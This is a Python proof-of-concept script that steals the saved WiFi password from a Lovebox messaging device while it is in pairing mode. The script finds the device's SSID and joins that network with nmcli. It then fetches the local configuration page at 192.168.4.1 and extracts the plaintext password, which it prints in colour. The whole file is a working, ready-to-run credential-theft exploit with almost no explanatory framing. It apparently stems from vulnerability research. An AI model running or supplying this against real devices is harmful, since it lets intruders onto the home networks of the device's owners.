#! /bin/python3
# Proof of concept code for stealing the WiFi password of a network with a Lovebox connected
# The Lovebox must be in pairing mode
from wifi import Cell, Scheme
import subprocess
import requests
import re
from colorama import init, Fore, Style

# Add pretty colors 
reset = Style.RESET_ALL
goodtick = Fore.BLUE + "[" + Fore.GREEN + "+" + Fore.BLUE + "] " + reset
badtick = Fore.BLUE + "[" + Fore.RED + "!" + Fore.BLUE + "] " + reset

# Get the router URL
url = "http://192.168.4.1/wifi?lang=en&scan=1"
target = "" 

# List all the SSIDS and assign to schemes
ssids = [cell.ssid for cell in Cell.all('wlp5s0')]
schemes = list(Scheme.all())

# Check for the Lovebox SSID 
for i in ssids:
    # If lovebox is found, set it as the target
    if "Lovebox" in str(i):
        print(goodtick + Fore.GREEN + "Lovebox device found broadcasting SSID")# + Fore.RED + str(i))
        target = str(i)
        break
# If Lovebox is not found, exit
if "Lovebox" not in str(ssids):
    print(badtick + Fore.RED + "Lovebox network not found...")
    exit()

# Connect to the lovebox network
print(goodtick + Fore.GREEN+"Connecting to Lovebox SSID")
subprocess.run(["nmcli", "dev", "wifi", "connect", target], stdout=subprocess.DEVNULL)

print(goodtick +"Retrieving Password")
# Get URL with plaintext password
text = requests.get(url).text

# Clean up string
password = text.partition("Your WiFi password")
sep = '\'><'
password = password[2]
stripped = password.split(sep,1)[0]
stripped = stripped.replace("\' value=\'","")

# Display password
print(goodtick + Fore.GREEN+"The WiFi Password for the network it is connected to is: " + Fore.RED + stripped)







